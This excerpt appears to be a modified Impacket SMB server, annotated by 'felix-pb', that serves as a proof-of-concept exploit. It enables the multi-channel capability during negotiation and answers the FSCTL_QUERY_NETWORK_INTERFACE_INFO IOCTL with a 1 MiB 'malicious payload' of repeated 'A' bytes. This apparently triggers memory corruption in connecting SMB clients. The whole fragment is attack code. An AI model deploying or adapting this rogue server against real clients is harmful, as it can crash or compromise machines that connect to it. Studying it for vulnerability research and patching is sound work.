...
class SMB2Commands:
    ...
    def smb2Negotiate(connId, smbServer, recvPacket, isSMB1=False):
        ...
        # felix-pb: enable multi-channel capability
        respSMBCommand['Capabilities'] = 0x8
        ...
        respSMBCommand['NegotiateContextList'] = b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
    ...
    def smb2Ioctl(connId, smbServer, recvPacket):
        ...
        # felix-pb: send malicious payload (1 MiB of b'A') if the IOCTL request's CtlCode is FSCTL_QUERY_NETWORK_INTERFACE_INFO
        # note: I added this "if" branch (i.e. the "elif" branch used to be an "if" branch).
        if ioctlRequest['CtlCode'] == smb2.FSCTL_QUERY_NETWORK_INTERFACE_INFO:
            outputData = b'A' * 1024 * 1024
            errorCode = STATUS_SUCCESS
        ...
        elif ioctlRequest['CtlCode'] in ioctls:
